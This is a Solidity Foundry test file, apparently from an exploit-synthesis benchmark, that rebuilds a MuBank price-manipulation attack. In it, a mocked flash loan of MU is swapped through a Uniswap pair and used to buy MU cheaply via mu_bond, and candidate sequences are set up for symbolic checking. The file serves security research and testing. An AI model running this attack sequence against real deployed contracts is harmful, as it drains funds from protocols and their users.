// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Mu.sol";
import "./MuBank.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDCE} from "@utils/USDCE.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract MUMUGTest is Test, BlockLoader {
    Mu mu;
    USDCE usdce;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    MuBank mubank;
    address attacker;
    address constant owner = address(0x123456);
    uint112 reserve0pair = 110596398651;
    uint112 reserve1pair = 172739951491310439336991;
    uint32 blockTimestampLastpair = 1670632626;
    uint256 kLastpair = 19102449214934407600169207587014640;
    uint256 price0CumulativeLastpair =
        308814746138342549066779453499621908384171319637193787;
    uint256 price1CumulativeLastpair = 108977737583418847522328147893;
    uint256 totalSupplymu = 1000000000000000000000000;
    uint256 balanceOfmumubank = 100000000000000000000000;
    uint256 balanceOfmupair = 172739951491310439336991;
    uint256 balanceOfmuattacker = 0;
    uint256 totalSupplyusdce = 193102891951559;
    uint256 balanceOfusdcemubank = 0;
    uint256 balanceOfusdcepair = 110596398651;
    uint256 balanceOfusdceattacker = 0;

    function setUp() public {
        attacker = address(this);
        vm.startPrank(owner);
        mu = new Mu(totalSupplymu);
        usdce = new USDCE();
        pair = new UniswapV2Pair(
            address(usdce),
            address(mu),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        mubank = new MuBank(address(router), address(pair), address(mu));
        // Initialize balances and mock flashloan.
        usdce.transfer(address(pair), balanceOfusdcepair);
        mu.transfer(address(pair), balanceOfmupair);
        mu.transfer(address(mubank), balanceOfmumubank);
        usdce.approve(attacker, UINT256_MAX);
        mu.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(pair),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(pair), mu.decimals());
        emit log_string("");
        emit log_string("Mubank Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(mubank),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(mubank), mu.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdce), attacker, usdce.decimals());
        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdce.balanceOf(attacker) >= 1e6;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdce(uint256 amount) internal {
        usdce.transferFrom(owner, attacker, amount);
    }

    function payback_usdce(uint256 amount) internal {
        usdce.transfer(owner, amount);
    }

    function borrow_mu(uint256 amount) internal {
        mu.transferFrom(owner, attacker, amount);
    }

    function payback_mu(uint256 amount) internal {
        mu.transfer(owner, amount);
    }

    function swap_pair_usdce_mu(uint256 amount) internal {
        usdce.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdce);
        path[1] = address(mu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_mu_usdce(uint256 amount) internal {
        mu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mu);
        path[1] = address(usdce);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function swap_mubank_usdce_mu(uint256 sendAmount) internal {
        usdce.approve(address(mubank), type(uint).max);
        mubank.mu_bond(address(usdce), sendAmount);
    }

    function test_gt() public {
        borrow_mu(99000e18);
        printBalance("After step0 ");
        swap_pair_mu_usdce(99000e18);
        printBalance("After step1 ");
        swap_mubank_usdce_mu(22960e18);
        printBalance("After step2 ");
        payback_mu(99297e18);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == 99594890999999989240398);
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        payback_mu(amt3);
        assert(!attackGoal());
    }

    function check_cand0(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == 99594890999999989240398);
        borrow_usdce(amt0);
        swap_mubank_usdce_mu(amt1);
        swap_pair_mu_usdce(amt2);
        payback_usdce(amt3);
        assert(!attackGoal());
    }

    function check_cand1(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == 99594890999999989240398);
        borrow_usdce(amt0);
        swap_pair_usdce_mu(amt1);
        swap_pair_mu_usdce(amt2);
        payback_usdce(amt3);
        assert(!attackGoal());
    }

    function check_cand2(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == 99594890999999989240398);
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        payback_mu(amt3);
        assert(!attackGoal());
    }

    function check_cand3(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == 99594890999999989240398);
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_pair_usdce_mu(amt2);
        payback_mu(amt3);
        assert(!attackGoal());
    }

    function check_cand4(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == 99594890999999989240398);
        borrow_usdce(amt0);
        swap_mubank_usdce_mu(amt1);
        swap_pair_mu_usdce(amt2);
        swap_pair_mu_usdce(amt3);
        payback_usdce(amt4);
        assert(!attackGoal());
    }

    function check_cand5(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == 99594890999999989240398);
        borrow_usdce(amt0);
        swap_pair_usdce_mu(amt1);
        swap_pair_mu_usdce(amt2);
        swap_pair_mu_usdce(amt3);
        payback_usdce(amt4);
        assert(!attackGoal());
    }

    function check_cand6(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == 99594890999999989240398);
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        swap_pair_mu_usdce(amt3);
        payback_mu(amt4);
        assert(!attackGoal());
    }

    function check_cand7(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == 99594890999999989240398);
        borrow_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_pair_usdce_mu(amt2);
        swap_pair_mu_usdce(amt3);
        payback_mu(amt4);
        assert(!attackGoal());
    }
}
